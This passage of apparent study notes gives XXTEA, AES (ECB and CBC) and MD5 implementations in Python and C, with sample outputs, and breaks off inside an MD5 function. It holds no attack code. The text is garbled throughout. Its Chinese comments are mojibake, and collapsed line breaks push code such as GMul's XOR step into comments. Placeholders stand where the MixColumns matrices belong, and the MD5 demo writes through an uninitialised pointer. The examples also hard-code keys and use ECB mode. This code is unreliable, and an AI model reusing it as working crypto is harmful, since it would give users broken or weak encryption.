delta = 0x9e3779b9 rounds = 6 + 52 // n total = c_uint32(0) z = c_uint32(v[n - 1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n - 1): y = c_uint32(v[p + 1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value z.value = v[n - 1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x9e3779b9 rounds = 6 + 52 // n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v# testif __name__ == \"__main__\": # è¯¥ç®—æ³•ä¸­æ¯æ¬¡å¯åŠ å¯†ä¸åª 64bit çš„æ•°æ®ï¼Œå¹¶ä¸”åŠ å¯†çš„è½®æ•°ç”±åŠ å¯†æ•°æ®é•¿åº¦å†³å®š v = [0x6869216f, 0x61636961] k = [0x1, 0x2, 0x3, 0x4] n = 2 print(\"Data is : \", hex(v[0]), hex(v[1])) res = encrypt(n, v, k) print(\"Encrypted data is : \", hex(res[0]), hex(res[1])) res = decrypt(n, res, k) print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x973cd3b0 0x797bf2abDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>#define DELTA 0x9e3779b9#define MX (((z>>5^y&lt;&lt;2) + (y>>3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4])&#123; uint32_t y, z, sum; unsigned p, rounds, e; // åŠ å¯† if (n > 1) &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum >> 2) &amp; 3; for (p = 0; p&lt;n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; // è§£å¯† else if (n &lt; -1) &#123; n = -n; rounds = 6 + 52 / n; sum = rounds*DELTA; y = v[0]; do &#123; e = (sum >> 2) &amp; 3; for (p = n - 1; p>0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125;int main()&#123; /* è¯¥ç®—æ³•ä¸­æ¯æ¬¡å¯åŠ å¯†ä¸åª 64bit çš„æ•°æ®ï¼Œå¹¶ä¸”åŠ å¯†çš„è½®æ•°ç”±åŠ å¯†æ•°æ®é•¿åº¦å†³å®š */ uint32_t v[2] = &#123;0x6869216f, 0x61636961 &#125;; uint32_t const k[4] = &#123;0x1, 0x2, 0x3, 0x4&#125;; //n çš„ç»å¯¹å€¼è¡¨ç¤º v çš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯† int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); btea(v, n, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); btea(v, -n, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x973cd3b0 0x797bf2abDecrypted data is : 0x6869216f 0x61636961*/ # AES from Crypto.Cipher import AESpassword = b'secret!!secret!!' # ç§˜é’¥å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®text = b'TextTextTextText' # æ˜æ–‡å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®ï¼Œå¦‚æœä¸å¤Ÿ 16 å­—èŠ‚éœ€è¦è¿›è¡Œè¡¥å…¨aes = AES.new(password, AES.MODE_ECB) # åˆ›å»ºä¸€ä¸ª aes å¯¹è±¡# AES.MODE_ECB è¡¨ç¤ºæ¨¡å¼æ˜¯ ECB æ¨¡å¼en_text = aes.encrypt(text) # åŠ å¯†æ˜æ–‡print(\"å¯†æ–‡ï¼š\", en_text) # åŠ å¯†æ˜æ–‡ï¼Œbytes ç±»å‹de_text = aes.decrypt(en_text) # è§£å¯†å¯†æ–‡print(\"æ˜æ–‡ï¼š\", de_text)'''å¯†æ–‡ï¼š b'\\t9\\x9b\\xc5\\x19E\\xeb4oL\\x1a`\\xc7\\x8b\\xd4\\xb2'æ˜æ–‡ï¼š b'TextTextTextText'''' todo #include &lt;stdint.h>#include &lt;stdio.h>#include &lt;string.h>typedef struct&#123; uint32_t eK[44], dK[44]; // encKey, decKey int Nr; // 10 rounds&#125;AesKey;#define BLOCKSIZE 16 //AES-128 åˆ†ç»„é•¿åº¦ä¸º 16 å­—èŠ‚// uint8_t y[4] -> uint32_t x#define LOAD32H(x, y) \\ do &#123; (x) = ((uint32_t)((y)[0] &amp; 0xff)&lt;&lt;24) | ((uint32_t)((y)[1] &amp; 0xff)&lt;&lt;16) | \\ ((uint32_t)((y)[2] &amp; 0xff)&lt;&lt;8) | ((uint32_t)((y)[3] &amp; 0xff));&#125; while(0)// uint32_t x -> uint8_t y[4]#define STORE32H(x, y) \\ do &#123; (y)[0] = (uint8_t)(((x)>>24) &amp; 0xff); (y)[1] = (uint8_t)(((x)>>16) &amp; 0xff); \\ (y)[2] = (uint8_t)(((x)>>8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff); &#125; while(0)// ä» uint32_t x ä¸­æå–ä»ä½ä½å¼€å§‹çš„ç¬¬ n ä¸ªå­—èŠ‚#define BYTE(x, n) (((x) >> (8 * (n))) &amp; 0xff)/* used for keyExpansion */// å­—èŠ‚æ›¿æ¢ç„¶åå¾ªç¯å·¦ç§» 1 ä½#define MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \\ ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))//uint32_t x å¾ªç¯å·¦ç§» n ä½#define ROF32(x, n) (((x) &lt;&lt; (n)) | ((x) >> (32-(n))))//uint32_t x å¾ªç¯å³ç§» n ä½#define ROR32(x, n) (((x) >> (n)) | ((x) &lt;&lt; (32-(n))))/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */// AES-128 è½®å¸¸é‡static const uint32_t rcon[10] = &#123; 0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL, 0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL&#125;;// S ç›’unsigned char S[256] = &#123; 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16&#125;;// é€† S ç›’unsigned char inv_S[256] = &#123; 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;/* copy in[16] to state[4][4] */int loadStateArray(uint8_t (*state)[4], const uint8_t *in) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[j][i] = *in++; &#125; &#125; return 0;&#125;/* copy state[4][4] to out[16] */int storeStateArray(uint8_t (*state)[4], uint8_t *out) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; *out++ = state[j][i]; &#125; &#125; return 0;&#125;// ç§˜é’¥æ‰©å±•int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) &#123; if (NULL == key || NULL == aesKey)&#123; printf(\"keyExpansion param is NULL\\n\"); return -1; &#125; if (keyLen != 16)&#123; printf(\"keyExpansion keyLen = %d, Not support.\\n\", keyLen); return -1; &#125; uint32_t *w = aesKey->eK; // åŠ å¯†ç§˜é’¥ uint32_t *v = aesKey->dK; // è§£å¯†ç§˜é’¥ /* keyLen is 16 Bytes, generate uint32_t W[44]. */ /* W[0-3] */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(w[i], key + 4*i); &#125; /* W[4-43] */ for (int i = 0; i &lt; 10; ++i) &#123; w[4] = w[0] ^ MIX(w[3]) ^ rcon[i]; w[5] = w[1] ^ w[4]; w[6] = w[2] ^ w[5]; w[7] = w[3] ^ w[6]; w += 4; &#125; w = aesKey->eK+44 - 4; // è§£å¯†ç§˜é’¥çŸ©é˜µä¸ºåŠ å¯†ç§˜é’¥çŸ©é˜µçš„å€’åºï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼ŒæŠŠ ek çš„ 11 ä¸ªçŸ©é˜µå€’åºæ’åˆ—åˆ†é…ç»™ dk ä½œä¸ºè§£å¯†ç§˜é’¥ // å³ dk [0-3]=ek [41-44], dk [4-7]=ek [37-40]... dk [41-44]=ek [0-3] for (int j = 0; j &lt; 11; ++j) &#123; for (int i = 0; i &lt; 4; ++i) &#123; v[i] = w[i]; &#125; w -= 4; v += 4; &#125; return 0;&#125;// è½®ç§˜é’¥åŠ int addRoundKey(uint8_t (*state)[4], const uint32_t *key) &#123; uint8_t k[4][4]; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; k[i][j] = (uint8_t) BYTE(key[j], 3 - i); /* æŠŠ uint32 key [4] å…ˆè½¬æ¢ä¸ºçŸ©é˜µ uint8 k [4][4] */ state[i][j] ^= k[i][j]; &#125; &#125; return 0;&#125;// å­—èŠ‚æ›¿æ¢int subBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = S[state[i][j]]; // ç›´æ¥ä½¿ç”¨åŸå§‹å­—èŠ‚ä½œä¸º S ç›’æ•°æ®ä¸‹æ ‡ &#125; &#125; return 0;&#125;// é€†å­—èŠ‚æ›¿æ¢int invSubBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = inv_S[state[i][j]]; &#125; &#125; return 0;&#125;// è¡Œç§»ä½int shiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; // ä¾¿äºè¡Œå¾ªç¯ç§»ä½ï¼Œå…ˆæŠŠä¸€è¡Œ 4 å­—èŠ‚æ‹¼æˆ uint_32 ç»“æ„ï¼Œç§»ä½åå†è½¬æˆç‹¬ç«‹çš„ 4 ä¸ªå­—èŠ‚ uint8_t LOAD32H(block[i], state[i]); block[i] = ROF32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;// é€†è¡Œç§»ä½int invShiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(block[i], state[i]); block[i] = ROR32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;/* Galois Field (256) Multiplication of two Bytes */// ä¸¤å­—èŠ‚çš„ä¼½ç½—ååŸŸä¹˜æ³•è¿ç®—uint8_t GMul(uint8_t u, uint8_t v) &#123; uint8_t p = 0; for (int i = 0; i &lt; 8; ++i) &#123; if (u &amp; 0x01) &#123; // p ^= v; &#125; int flag = (v &amp; 0x80); v &lt;&lt;= 1; if (flag) &#123; v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */ &#125; u >>= 1; &#125; return p;&#125;// åˆ—æ··åˆint mixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &lt;!--swigï¿¼0-->; /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; // ä¼½ç½—ååŸŸåŠ æ³•å’Œä¹˜æ³• state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// é€†åˆ—æ··åˆint invMixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &lt;!--swigï¿¼1-->; // ä½¿ç”¨åˆ—æ··åˆçŸ©é˜µçš„é€†çŸ©é˜µ /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// AES-128 åŠ å¯†æ¥å£ï¼Œè¾“å…¥ key åº”ä¸º 16 å­—èŠ‚é•¿åº¦ï¼Œè¾“å…¥é•¿åº¦åº”è¯¥æ˜¯ 16 å­—èŠ‚æ•´å€æ•°ï¼Œ// è¿™æ ·è¾“å‡ºé•¿åº¦ä¸è¾“å…¥é•¿åº¦ç›¸åŒï¼Œå‡½æ•°è°ƒç”¨å¤–éƒ¨ä¸ºè¾“å‡ºæ•°æ®åˆ†é…å†…å­˜int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = ct; const uint32_t *rk = aesKey.eK; // è§£å¯†ç§˜é’¥æŒ‡é’ˆ uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == pt || NULL == ct)&#123; printf(\"param err.\\n\"); return -1; &#125; if (keyLen > 16)&#123; printf(\"keyLen must be 16.\\n\"); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(\"inLen is invalid.\\n\"); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); // ç§˜é’¥æ‰©å±• // ä½¿ç”¨ ECB æ¨¡å¼å¾ªç¯åŠ å¯†å¤šä¸ªåˆ†ç»„é•¿åº¦çš„æ•°æ® for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // æŠŠ 16 å­—èŠ‚çš„æ˜æ–‡è½¬æ¢ä¸º 4x4 çŠ¶æ€çŸ©é˜µæ¥è¿›è¡Œå¤„ç† loadStateArray(state, pt); // è½®ç§˜é’¥åŠ  addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; subBytes(state); // å­—èŠ‚æ›¿æ¢ shiftRows(state); // è¡Œç§»ä½ mixColumns(state); // åˆ—æ··åˆ addRoundKey(state, rk); // è½®ç§˜é’¥åŠ  &#125; subBytes(state); // å­—èŠ‚æ›¿æ¢ shiftRows(state); // è¡Œç§»ä½ // æ­¤å¤„ä¸è¿›è¡Œåˆ—æ··åˆ addRoundKey(state, rk+4); // è½®ç§˜é’¥åŠ  // æŠŠ 4x4 çŠ¶æ€çŸ©é˜µè½¬æ¢ä¸º uint8_t ä¸€ç»´æ•°ç»„è¾“å‡ºä¿å­˜ storeStateArray(state, pos); pos += BLOCKSIZE; // åŠ å¯†æ•°æ®å†…å­˜æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåˆ†ç»„ pt += BLOCKSIZE; // æ˜æ–‡æ•°æ®æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåˆ†ç»„ rk = aesKey.eK; // æ¢å¤ rk æŒ‡é’ˆåˆ°ç§˜é’¥åˆå§‹ä½ç½® &#125; return 0;&#125;// AES128 è§£å¯†ï¼Œ å‚æ•°è¦æ±‚åŒåŠ å¯†int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = pt; const uint32_t *rk = aesKey.dK; // è§£å¯†ç§˜é’¥æŒ‡é’ˆ uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == ct || NULL == pt)&#123; printf(\"param err.\\n\"); return -1; &#125; if (keyLen > 16)&#123; printf(\"keyLen must be 16.\\n\"); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(\"inLen is invalid.\\n\"); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); // ç§˜é’¥æ‰©å±•ï¼ŒåŒåŠ å¯† for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // æŠŠ 16 å­—èŠ‚çš„å¯†æ–‡è½¬æ¢ä¸º 4x4 çŠ¶æ€çŸ©é˜µæ¥è¿›è¡Œå¤„ç† loadStateArray(state, ct); // è½®ç§˜é’¥åŠ ï¼ŒåŒåŠ å¯† addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; invShiftRows(state); // é€†è¡Œç§»ä½ invSubBytes(state); // é€†å­—èŠ‚æ›¿æ¢ï¼Œè¿™ä¸¤æ­¥é¡ºåºå¯ä»¥é¢ å€’ addRoundKey(state, rk); // è½®ç§˜é’¥åŠ ï¼ŒåŒåŠ å¯† invMixColumns(state); // é€†åˆ—æ··åˆ &#125; invSubBytes(state); // é€†å­—èŠ‚æ›¿æ¢ invShiftRows(state); // é€†è¡Œç§»ä½ // æ­¤å¤„æ²¡æœ‰é€†åˆ—æ··åˆ addRoundKey(state, rk+4); // è½®ç§˜é’¥åŠ ï¼ŒåŒåŠ å¯† storeStateArray(state, pos); // ä¿å­˜æ˜æ–‡æ•°æ® pos += BLOCKSIZE; // è¾“å‡ºæ•°æ®å†…å­˜æŒ‡é’ˆç§»ä½åˆ†ç»„é•¿åº¦ ct += BLOCKSIZE; // è¾“å…¥æ•°æ®å†…å­˜æŒ‡é’ˆç§»ä½åˆ†ç»„é•¿åº¦ rk = aesKey.dK; // æ¢å¤ rk æŒ‡é’ˆåˆ°ç§˜é’¥åˆå§‹ä½ç½® &#125; return 0;&#125;// æ–¹ä¾¿è¾“å‡º 16 è¿›åˆ¶æ•°æ®void printHex(uint8_t *ptr, int len, char *tag) &#123; printf(\"%s\\ndata[%d]: \", tag, len); for (int i = 0; i &lt; len; ++i) &#123; printf(\"%.2X \", *ptr++); &#125; printf(\"\\n\");&#125;//S ç›’è½¬é€† S ç›’ï¼ŒS ç›’ä¸æ˜¯æ ‡å‡†çš„æ—¶å€™ä½¿ç”¨void get_S_rev()&#123; uint8_t line=0,rol=0;// ä½ç½® for(int i=0;i&lt;256;i++)&#123; line = (S[i]&amp;0xf0)>>4; rol = S[i]&amp;0xf; inv_S[line*16+rol] = i; &#125;&#125;int main() &#123; //get_S_rev ();//S ç›’æœ‰å˜åŒ–ï¼Œéœ€è¦æ±‚å‡ºé€† S ç›’ const uint8_t key[16] = &#123;0x73,0x65,0x63,0x72,0x65,0x74,0x21,0x21,0x73,0x65,0x63,0x72,0x65,0x74,0x21,0x21&#125;; const uint8_t pt[16]=&#123;0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74,0x54,0x65,0x78,0x74&#125;; uint8_t ct[16] = &#123;0&#125;; // å¤–éƒ¨ç”³è¯·è¾“å‡ºæ•°æ®å†…å­˜ï¼Œç”¨äºåŠ å¯†åçš„æ•°æ® uint8_t plain[16] = &#123;0&#125;; // å¤–éƒ¨ç”³è¯·è¾“å‡ºæ•°æ®å†…å­˜ï¼Œç”¨äºè§£å¯†åçš„æ•°æ® aesEncrypt(key, 16, pt, ct, 16); // åŠ å¯† printHex(ct, 16, \"after encryption:\"); // æ‰“å°åŠ å¯†åçš„å¯†æ–‡ aesDecrypt(key, 16, ct, plain, 16); // è§£å¯† printHex(plain, 16, \"after decryption:\"); // æ‰“å°è§£å¯†åçš„æ˜æ–‡æ•°æ®. return 0;&#125;/*after encryption:data[16]: 09 39 9B C5 19 45 EB 34 6F 4C 1A 60 C7 8B D4 B2 after decryption:data[16]: 54 65 78 74 54 65 78 74 54 65 78 74 54 65 78 74 */ from Crypto.Cipher import AESpassword = b'secret!!secret!!' # ç§˜é’¥å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®iv = b'1234567812345678' # iv åç§»é‡ï¼Œbytes ç±»å‹text = b'TextTextTextText' # æ˜æ–‡å¿…é¡»ä¸º 16 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚çš„å€æ•°çš„å­—èŠ‚å‹æ•°æ®ï¼Œå¦‚æœä¸å¤Ÿ 16 å­—èŠ‚éœ€è¦è¿›è¡Œè¡¥å…¨aes = AES.new(password, AES.MODE_CBC, iv) # åˆ›å»ºä¸€ä¸ª aes å¯¹è±¡# AES.MODE_CBC è¡¨ç¤ºæ¨¡å¼æ˜¯ CBC æ¨¡å¼en_text = aes.encrypt(text)print(\"å¯†æ–‡ï¼š\", en_text) # åŠ å¯†æ˜æ–‡ï¼Œbytes ç±»å‹aes = AES.new(password, AES.MODE_CBC, iv) # CBC æ¨¡å¼ä¸‹è§£å¯†éœ€è¦é‡æ–°åˆ›å»ºä¸€ä¸ª aes å¯¹è±¡de_text = aes.decrypt(en_text)print(\"æ˜æ–‡ï¼š\", de_text)'''å¯†æ–‡ï¼š b'v\\rv`HDi\\xbbV\\xcb\\xef\\x02\\x8f\\x93\\xb09'æ˜æ–‡ï¼š b'TextTextTextText'''' todo todo # MD5 from hashlib import md5s = 'oacia'new_md5 = md5()new_md5.update(s.encode(encoding='utf-8'))s_enc = new_md5.hexdigest()print(s_enc)# 6a58e79a78afc9dd94485810106bc7e8 #include &lt;stdio.h>#include &lt;string.h>#include &lt;stdlib.h>#include \"md5.h\"void md5_enc(unsigned char encrypt[],unsigned char decrypt[])&#123; MD5_CTX md5; MD5Init(&amp;md5); MD5Update(&amp;md5,encrypt,strlen((char *)encrypt)); MD5Final(&amp;md5,decrypt);&#125;int main(int argc, char *argv[])&#123; char s[10] = \"oacia\"; unsigned char* s_enc; md5_enc(s,s_enc); for(int i=0;i&lt;16;i++)&#123; printf(\"%02x\",s_enc[i]);//6a58e79a78afc9dd94485810106bc7e8 &#125; return 0;&#125; #include &lt;memory.h>#include \"md5.h\" unsigned char PADDING[]=&#123;0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;; void MD5Init(MD5_CTX *context)&#123; //md5 åŸå§‹å¸¸é‡ context->count[0] = 0; context->count[1] = 0; context->state[0] = 0x67452301; context->state[1] = 0xEFCDAB89; context->state[2] = 0x98BADCFE; context->state[3] = 0x10325476;&#125;void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen)&#123; unsigned int i = 0,index = 0,partlen = 0; index = (context->count[0] >> 3) &amp; 0x3F; partlen = 64 - index; context->count[0] += inputlen &lt;&lt; 3; if(context->count[0] &lt; (inputlen &lt;&lt; 3)) context->count[1]++; context->count[1] += inputlen >> 29; if(inputlen >= partlen) &#123; memcpy(&amp;context->buffer[index],input,partlen); MD5Transform(context->state,context->buffer); for(i = partlen;i+64 &lt;= inputlen;i+=64) MD5Transform(context->state,&amp;input[i]); index = 